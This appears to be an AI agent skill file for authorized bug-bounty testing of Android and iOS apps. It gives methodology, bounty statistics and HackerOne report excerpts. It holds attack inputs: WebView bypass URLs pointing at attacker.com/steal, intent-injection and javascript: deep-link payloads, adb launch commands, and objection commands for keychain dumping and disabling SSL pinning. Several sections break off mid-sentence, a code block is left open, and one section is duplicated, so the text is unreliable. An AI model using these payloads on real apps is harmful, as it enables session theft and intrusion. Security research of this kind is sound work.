---
name: bbhunt-mobile
description: "Use for APK/IPA analysis, deep links, WebViews, exported components, certificate pinning, local storage, and API secrets in mobile clients. Unified from 2 upstream skills (h1skills, hunting). Plus evidence from all 15,259 disclosed HackerOne reports. For authorized security testing only."
agent_created: true
---

# Mobile App and Client-Side Flaws — unified methodology

> **Unified skill.** Built from 2 upstream skills across h1skills, hunting and the local HackerOne corpus. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.

## Corpus-backed method (this class)

1. Acquire the app through authorized channels and document the version/hash.
2. Static analysis: decompile, grep for endpoints, secrets, WebView settings, deep-link schemes, and exported components.
3. Map the API surface to the web skill router — most valid mobile findings are server-side authz issues reachable from the app.
4. Test deep links for unauthorized navigation, intent injection, and WebView URL control.
5. Check local storage and backups for sensitive data at rest, using your own test account.
6. Dynamic testing (Frida/objection) only within authorization and with pinned-cert handling that does not violate program rules.

### Signals

- An in-scope mobile application or downloadable APK/IPA
- Deep-link handlers, WebViews, or exported activities
- Hardcoded endpoints/keys in the binary

### Kill criteria

- Client-only issue with no security consequence for other users or the server.
- App is out of scope or a third-party product.
- Requires a rooted/jailbroken victim device as the only precondition.

### Escalation chains

- Client secret -> API access -> cross-tenant data.
- Deep link -> WebView injection -> local data theft.

### Veteran tip

Treat the mobile app as a rich source of API surface and secrets; the highest-impact bugs are usually on the server.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Decompile and inspect exported components and URL schemes.
- Test deep links for auth bypass, open redirect, and token leakage.
- Check local storage, logs, backups, and clipboard for secrets.
- Intercept traffic and test certificate pinning bypass.
- Look for insecure WebViews and JS bridges.

### Deeper checklist

- Decompile and inspect exported activities/services/receivers and URL schemes.
- Test deep links for auth bypass, open redirect, and token leakage.
- Check local storage, logs, backups, and clipboard for secrets.
- Intercept traffic and test certificate pinning bypass.
- Look for insecure WebViews and JS bridges.
- Verify server-side impact, not just client behavior.

### A. Discovery checklist — concrete fingerprints, endpoints, headers, CVEs, misconfigs to look for

- **Pattern 1 — Deep link / custom-scheme hijack → OAuth code or token theft.** Android does NOT verify ownership of custom URI schemes; any installed app can register `myapp://`. A callback `myapp://oauth?code=...` can be intercepted; without PKCE the code is redeemed for a token. **CVE-2026-26123** (Microsoft Authenticator, patched Mar 2026) is the canonical 2026 example. Prefer verified HTTPS App Links (`android:autoVerify`, `assetlinks.json`); Android 12+ stricter web-intent handling reduces but does not remove collision risk (disambiguation dialog).
- **Pattern 2 — WebView host-check bypass (open redirect).** `startsWith("trusted.com")` / `contains("trusted.com")` / `endsWith("wikipedia.org")` are all bypassable: `trusted.com@attacker.com/`, `trusted.com.attacker.com/steal`, `evil-wikipedia.org` (endsWith matches). **GHSL-2026-101 / CVE-2026-65993** (Wikipedia Android `wikipedia://` handler): `evil-wikipedia.org.endsWith("wikipedia.org")` = true → all `centralauth_*` cookies (`centralauth_Session`, `centralauth_Token` ~30-day remember-me, `centralauth_User`) sent to attacker — global SSO across ~800 Wikimedia projects.
- **Pattern 3 — Intent redirection into private components.** Exported activity extracts a nested Intent from extras (or `Intent.parseUri()` on an `intent://` URL) and calls `startActivity()` → launches non-exported activities, ContentProviders, and can grant `FLAG_GRANT_READ_URI_PERMISSION` for file theft. **GHSL-2026-103 / CVE-2026-65994** (Wikipedia `

### Signals and surfaces

### Signal

- Reports: **198** · paid: **67**
- Median bounty **$750** · p90 **$2,940** · max **$10,000** · total **$80,330**
- Median upvotes **18**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| Mail.ru | 19 | $14,950 | 627 |
| GitHub Security Lab | 6 | $12,200 | 102 |
| X / xAI | 16 | $12,180 | 677 |
| Pornhub | 4 | $8,000 | 85 |
| Slack | 3 | $5,000 | 402 |
| VK.com | 7 | $4,400 | 261 |
| Shopify | 7 | $3,400 | 367 |
| Nextcloud | 26 | $3,275 | 515 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`deeplink` `intent` `webview` `keystore` `shared_prefs` `keychain`

### Techniques, payloads and bypasses

### Payloads & probes

- Deep link -> `app://open?url=https://evil.com` `app://webview?url=javascript:...`
- WebView -> `addJavascriptInterface` abuse
- Backup -> extract shared_prefs / Keychain

### Bypass tricks

- Bypass pinning with Frida/Objection.
- Use dynamic instrumentation for root/jailbreak checks.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **[Grab Android/iOS] Insecure deeplink leads to sensitive information disclosure** — `#401793` · Grab · $0 · ▲552
  > I've found a set of possible deeplinks, one of them ( ) could lead that an arbtrary URL was opened in a built-in browser in activity using that code (should be used in an external browser/messenger)
- **Periscope android app deeplink leads to CSRF in follow action** — `#583987` · X / xAI · $1,540 · ▲224
  > + It means we can use ` pscp://user/<user-id or pscpd://user/<user-id `
- **[PayPal Android] Remote theft of user session using push_notification_webview deeplink** — `#424443` · PayPal · $0 · ▲188
  > A deeplink feature built into the PayPal Android application failed to validate the requested endpoint.
- **1 click Account takeover via deeplink in [com.kayak.android]** — `#1667998` · KAYAK · $0 · ▲173
  > https://fluidattacks.com/blog/account-takeover-kayak/
- **[Venmo Android] Remote theft of user session** — `#401940` · PayPal · $0 · ▲151
  > Khilly highlighted a logic flaw in the Venmo app’s use of `android.net.Uri` parser, which we further explored together.
- **[Information Disclosure] Amazon S3 Bucket of Shopify Ping (iOS) have public access of other users image** — `#1021906` · Shopify · $2,900 · ▲135
  > Back to Shopify Store as Customer and inspect the website code, you will find the URL of image ██████████ https://ping-api-production.s3.us-west-2.amazonaws.com/oks██████
- **Changing email address

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 2× | `www.pscp.tv/<user-id>/follow` |
| 2× | `<meta>` |
| 2× | `../../../lib-1/libjnigraphics.so` |
| 1× | `) could lead that an arbtrary URL was opened in a built-in browser in activity` |
| 1× | `pscp://user/<user-id> or pscpd://user/<user-id>` |
| 1× | `and be the connected to the Grab account on Android app) - or you can use my test number` |
| 1× | `<script>alert('Javascript is executed.')</script>` |
| 1× | `alert()` |
| 1× | `DELETE /api/v1/logout HTTP/1.1 / authorization: Bearer atkn_********************************** / Host: accounts.shopify.com / Connection: cl` |
| 1× | `GET /oauth/userinfo HTTP/1.1 / Accept-Encoding: gzip, deflate / authorization: Bearer *************** / ....` |
| 1× | `adb shell / am start -n com.quora.android/com.quora.android.ActionBarContentActivity -e url 'http://test/test' -e html 'XSS<script>alert(123` |
| 1× | `am start -n com.quora.android/com.quora.android.ModalContentActivity -e url 'http://test/test' -e html '<script>alert(QuoraAndroid.getClipbo` |
| 1× | `Intent i = new Intent(); / i.setComponent(new ComponentName("com.quora.android","com.quora.android.ActionBarContentActivity")); / i.putExtra` |
| 1× | `HTTP/1.1 400 Bad Request / Content-Encoding: gzip / Content-Type: application/json; charset=utf-8 / Date: Tue, 31 Jan 2017 17:45:43 GMT / X-` |
| 1× | `ImageList.fetchImageInfo(..)` |
| 1× | `<script> / location="https://www.google.com/search?q=</title><h1><marquee><s>Injection<!--" / </script

### B. Techniques & bypasses — specific actionable techniques/payload shapes

```bash
# Android: launch an exported activity with a hostile URI (adb, second device/app context)
adb shell am start -n org.wikipedia/org.wikipedia.page.PageActivity \
  -a android.intent.action.VIEW \
  -d 'thankyou.evil-wikipedia.org/wiki/PoC?order_id=1&wmf_campaign=Android&amount=5&currency=USD'
adb shell am start -a android.intent.action.VIEW \
  -d 'wikipedia://evil-wikipedia.org/wiki/Main_Page'     # endsWith host-bypass variant

# WebView host-check bypass payloads to try against any deep-link router
https://trusted.com@attacker.com/steal
https://trusted.com.attacker.com/steal
https://evil-trusted.com/                    # for contains/endsWith checks
intent:#Intent;package=com.target.app;component=com.target.app/.InternalActivity;S.extra=evil;end

# Static triage
aapt dump xmltree target.apk AndroidManifest.xml | grep -iE 'exported|intent-filter|autoVerify|scheme'
jadx or apktool: grep for startActivity(, Intent.parseUri, setJavaScriptEnabled(true),
  getCookies/loadForRequest, shouldOverrideUrlLoading, startsWith/endsWith host checks

# iOS runtime (Frida/objection; non-jailbroken path = repackage with Frida Gadget via Sideloadly)
objection -g <bundle-id> explore
ios keychain dump --json keychain_output.json    # look for authToken, JWT, pincode + accessibility class
ios sslpinning disable                           # then proxy through Burp
ios jailbreak disable
env                                              # bundle/data dirs
file download /var/mobile/Containers/Data/Application/<UUID

### Validation and proof

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

### C. Validation / proof bar — how to confirm and avoid false positives

- **Prove real impact on a second controlled account or a safe callback** (existing reporting bar). For cookie/token theft, show the attacker-controlled server receiving a *live* `centralauth_*`-equivalent session token, then demonstrate that token authenticating to a second account/session. A 302 or a WebView loading your URL is not theft.
- **Attacker model matters — grade it honestly:** a local malicious-app prerequisite (Wikipedia GHSL cases, EngageSDK) is High/Critical for affected users but is NOT a remote one-click internet bug; Pwn2Own-style `CATEGORY_BROWSABLE` WebView→intent chains ARE remote one-click and grade higher. State the precondition explicitly in the finding.
- **Static-analysis blind spots:** host-string checks can look correct while the whitelisted domain has expired (Pattern 5), and SDK code may be the vulnerable layer (EngageSDK) rather than first-party code. Always confirm at runtime with a controlled domain.
- **WebView context is the amplifier:** require evidence that the loaded page actually had cookies/localStorage/JS bridge access (e.g., `setCookies()`/`loadForRequest()` call, `javaScriptEnabled=true`), not just "WebView navigated to attacker.com". An `Access-Control-Allow-Origin: *` injection must be shown enabling a cross-origin authenticated read.
- **iOS caveats:** keychain `kSecAttrAccessibleAlways` is a real finding only if the item is a secret; `env`/plist dumps on a simulator do not prove file-protection or Secure Enclave behavior. Check the actual accessibility c

### Escalation and related chains

### Escalation chains

- Deeplink -> token theft.
- WebView bridge -> RCE.

### Tools and wordlists

### Tools

`apktool` · `jadx` · `Frida` · `objection` · `MobSF`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_mobile.txt` | 77 |
| `~/.local/share/hackerone-reports/wordlists/params_mobile.txt` | 35 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_mobile.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_mobile.txt \
     -mr 'canary|error|invalid|not found' -rate 40
```

### Nuclei

Nuclei only sees the backend. Decompile the app and test deep links, WebViews, and local storage manually.

```sh
nuclei -u https://target -tags android,ios \
       -severity low,medium,high,critical -rl 40 -o nuclei_mobile.txt
nuclei -u https://target -t ~/nuclei-templates/http/misconfiguration \
       -rl 40 -o nuclei_mobile_misconfiguration.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

## Source skills merged into this topic

- `h1skills` — `hackerone-mobile`
- `hunting` — `mobile`

## References

- `references/unified-method.md` — complete deduplicated union of all upstream sections
- `references/upstream-*.md` — full original SKILL.md from each contributing repo
- `references/evidence.md` — corpus technique frequencies, parameters, case studies and payload bank
- `bbhunt-methodology` — orchestrator, state machine and class router
